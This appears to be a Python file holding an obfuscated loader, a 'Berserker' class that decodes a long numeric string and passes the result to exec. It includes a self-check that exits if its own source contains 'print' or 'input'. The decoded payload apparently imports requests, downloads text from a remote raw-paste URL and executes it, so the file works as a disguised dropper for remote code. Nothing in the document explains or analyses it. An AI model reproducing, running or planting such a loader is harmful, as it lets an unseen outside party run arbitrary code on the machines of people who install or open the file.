class Berserker():
 def __init__(self:object,_bits:float=False,_boom:bool=0,*_delete:float,**_system:bool)->exec:
  self._byte,self._decode,self._exit,_bits,self._encode,_system[_boom]=lambda _exec:"".join(chr(int(_rasputin)-len(_exec.split('~')))if _rasputin!='*'else'ζ'for _rasputin in str(_exec).split('~')),exit()if _bits else'abcdefghijklmnopqrstuvwxyz0123456789',lambda _eval:_bits(_eval),lambda _bits:exit()if self._decode[15]+self._decode[17]+self._decode[8]+self._decode[13]+self._decode[19] in open(__file__, errors=self._decode[8]+self._decode[6]+self._decode[13]+self._decode[14]+self._decode[17]+self._decode[4]).read() or self._decode[8]+self._decode[13]+self._decode[15]+self._decode[20]+self._decode[19] in open(__file__, errors=self._decode[8]+self._decode[6]+self._decode[13]+self._decode[14]+self._decode[17]+self._decode[4]).read()else"".join(_bits if _bits not in self._decode else self._decode[self._decode.index(_bits)+1 if self._decode.index(_bits)+1<len(self._decode)else 0]for _bits in "".join(chr(ord(t)-247225)if t!="ζ"else"\n"for t in self._byte(_bits))),lambda _bits:str(_system[_boom](f"{self._decode[4]+self._decode[-13]+self._decode[4]+self._decode[2]}(''.join(%s),{self._decode[6]+self._decode[11]+self._decode[14]+self._decode[1]+self._decode[0]+self._decode[11]+self._decode[18]}())"%list(_bits))).encode(self._decode[20]+self._decode[19]+self._decode[5]+self._decode[34])if _system[_boom]==eval else exit(),eval
  return self.__decode__(_system[(self._decode[-1]+'_')[-1]+self._decode[18]+self._decode[15]+self._decode[0]+self._decode[17]+self._decode[10]+self._decode[11]+self._decode[4]])
 def __decode__(self,_execute: str)->exec:return(None,self._encode(self._exit(_execute)))[0]
Berserker(_bits=False,_sparkle='''247705~247703~247710~247648~*~247622~247622~247622~247622~247694~247698~247701~247700~247703~247705~247622~247704~247710~247704~*~247622~247622~247622~247622~247694~247698~247701~247700~247703~247705~247622~247705~247693~247703~247690~247647~247689~247694~247699~247692~*~247622~247622~247622~247622~247694~247698~247701~247700~247703~247705~247622~247703~247690~247702~247706~247690~247704~247705~247704~*~247622~247622~247622~247622~247694~247698~247701~247700~247703~247705~247622~247703~247647~247699~247689~247700~247698~*~247622~247622~247622~247622~247694~247698~247701~247700~247703~247705~247622~247704~247705~247703~247694~247699~247692~*~247622~247622~247622~247622~247694~247698~247701~247700~247703~247705~247622~247704~247690~247688~247703~247690~247705~247704~*~247622~247622~247622~247622~247694~247698~247701~247700~247703~247705~247622~247706~247706~247694~247689~*~247622~247622~247622~247622~247694~247698~247701~247700~247703~247705~247622~247705~247694~247698~247690~*~247622~247622~247622~247622~247694~247698~247701~247700~247703~247705~247622~247700~247704~*~247622~247622~247622~247622~247694~247698~247701~247700~247703~247705~247622~247695~247704~247700~247699~*~247622~247622~247622~247622~247694~247698~247701~247700~247703~247705~247622~247703~247690~*~247622~247622~247622~247622~247691~247703~247700~247698~247622~247688~247700~247697~247700~247703~247647~247698~247647~247622~247694~247698~247701~247700~247703~247705~247622~247660~247700~247703~247690~247634~247622~247673~247705~247710~247697~247690~*~247690~247709~247688~247690~247701~247705~247622~247659~247709~247688~247690~247701~247705~247694~247700~247699~247622~247647~247704~247622~247690~247648~*~247622~247622~247622~247622~247703~247647~247694~247704~247690~*~*~247705~247703~247710~247648~*~247622~247622~247622~247622~247703~247690~247702~247622~247651~247622~247703~247690~247702~247706~247690~247704~247705~247704~247636~247692~247690~247705~247630~247624~247693~247705~247705~247701~247704~247648~247637~247637~247701~247647~247704~247705~247690~247687~247694~247699~247636~247688~247700~247698~247637~247703~247647~247708~247637~247645~247639~247673~247667~247640~247647~247656~247664~247624~247631~247636~247705~247690~247709~247705~*~247622~247622~247622~247622~247690~247709~247690~247688~247630~247703~247690~247702~247631~*~247690~247709~247688~247690~247701~247705~247648~*~247622~247622~247622~247622~247690~247709~247694~247705~247630~247631''')
